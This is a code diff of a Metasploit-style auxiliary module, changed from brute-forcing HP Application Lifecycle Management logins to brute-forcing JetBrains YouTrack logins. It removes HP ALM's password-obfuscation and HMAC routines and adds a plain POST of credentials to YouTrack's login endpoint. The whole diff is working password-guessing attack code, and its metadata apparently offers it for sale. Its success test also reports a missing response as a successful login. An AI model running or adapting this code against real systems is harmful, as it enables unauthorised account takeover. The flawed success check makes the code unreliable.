@@ -10,7 +10,7 @@ require 'metasploit/framework/login_scanner/http'
 module Metasploit
   module Framework
     module LoginScanner
-      class HPALM < ::Metasploit::Framework::LoginScanner::HTTP
+      class YouTrack < ::Metasploit::Framework::LoginScanner::HTTP
         def attempt_login(credential)
           result_opts = {
             credential: credential,
@@ -25,88 +25,27 @@ module Metasploit
             configure_http_client(cli)
             cli.connect
 
-            data = getbody(credential.public, obfu(credential.private))
-            data = data.gsub(/\n/, "\r\n")
-            tdid = hmac(data)
-
             req = cli.request_cgi({
-              'uri' => '/qcbin/servlet/tdservlet/TDAPI_GeneralWebTreatment',
+              'uri' => '/hub/api/rest/oauth2/interactive/login',
               'method' => 'POST',
-              'data' => data,
-              'headers' => {
-                'X-TD-ID' => tdid.upcase
-              },
-              'ctype' => 'text/html'
+              'vars_post' => {
+                'username' => credential.public,
+                'password' => credential.private
+              }
             })
 
             res = cli.send_recv(req)
 
-            if res && res.body =~ /LOGIN_SESSION_KEY/
-              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
+            if res && !res.headers['Set-Cookie']
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof:res)
             else
-              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res)
             end
-
           rescue Exception => e
             result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
           end
 
           ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
-        end
-
-        def getbody(username, password)
-          body =  %Q{\{
-0: "0:conststr:Login",
-1: \\0000002F\\0:conststr:2BA5C8C9-6E87-46A6-A171-25CF58D2BD44,
-2: "0:int:2",
-3: "0:int:-1",
-4: "0:conststr:",
-5: "0:int:-1",
-6: \\FFFFFFFF\\0}
-          creds = %Q{:conststr:\{
-USER_NAME:#{username},
-PASSWORD:\\#{password.length.to_s(16).rjust(8, '0')}\\#{password},
-CLIENTTYPE:\\0000002a\\Application Lifecycle Management Client UI,
-RETRIEVE_ADDITIONAL_INFO:,
-OTA_VERSION:12.50,
-OTA_BUILD_NUMBER:1287
-\}}
-
-          body << creds
-          body = body.gsub(/FFFFFFFF/, (creds.length+10).to_s(16).rjust(8,'0').upcase)
-body << %Q{
-,
-7: \\0000001A\\0:conststr:WIN-LIVTQRVJ9B2,
-8: "65536:str:0",
-9: "0:pint:0",
-10: "65536:str:0",
-11: "0:pint:0",
-12: "0:pint:0"
-\}
-}
-
-return body.encode('ascii')
-        end
-
-        def obfu(password)
-          key = 'SmolkaWasHereMonSher'
-          password = password.encode('utf-16be')
-          obfued_pass = 'OBFUSCATED'
-          b = 0
-          password.each_char do |c|
-            obfued_pass << (c.ord + key[b].ord).to_s
-            obfued_pass << '!'
-            if b == key.length - 1
-              b = 0
-            else
-              b = b + 1
-            end
-          end
-          return obfued_pass
-        end
-
-        def hmac(body)
-          return Digest::SHA256.hexdigest('{4947B489-F1D3-40e2-BD95-42851DC75CE6}' + body)
         end
       end
     end
@@ -123,19 +62,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-        'Name'           => 'HP Application Lifecycle Management Bruteforce',
+        'Name'           => 'YouTrack Bruteforce',
         'Description'    => %q(
-        This module attempts to bruteforce credentials on HP Application Lifecycle Management instances.
+        This module attempts to bruteforce weak credentials on a JetBrains YouTrack instance.
 
-        HP Application Lifecycle Management is a popular enterprise software suite for managing application and
-        software development lifecycles. Privileged access to an ALM instance could yield more information about
-        potential high-value targets on the network, as well as network credentials.
+The JetBrains YouTrack software suite enable development teams to manage
+and track development of software using agile-centered development strategies
+and bug tracking. Privileged access to a YouTrack instance may lead to
+sensitive information disclosure such as network credentials or high-value
+targets on the network.
 
         Categories: Enterprise
 
         Price: 3
 
-        Video: https://asciinema.org/a/edvi4g2xzjqclqlw094nfz8tg
+        Video: https://asciinema.org/a/adv9fwuwqt17hzgmikbbxgbf6
 
         OS: Multi
 
@@ -151,7 +92,8 @@ class MetasploitModule < Msf::Auxiliary
           [
           ],
         'DefaultOptions' => {
-            'RPORT'           => 8080,
+            'RPORT'           => 443,
+            'SSL' => true,
             'STOP_ON_SUCCESS' => true
         }
     )
@@ -168,7 +110,7 @@ class MetasploitModule < Msf::Auxiliary
       user_as_pass: datastore['USER_AS_PASS']
     )
 
-    scanner = Metasploit::Framework::LoginScanner::HPALM.new(
+    scanner = Metasploit::Framework::LoginScanner::YouTrack.new(
       configure_http_login_scanner(
         host: ip,
         port: datastore['RPORT'],
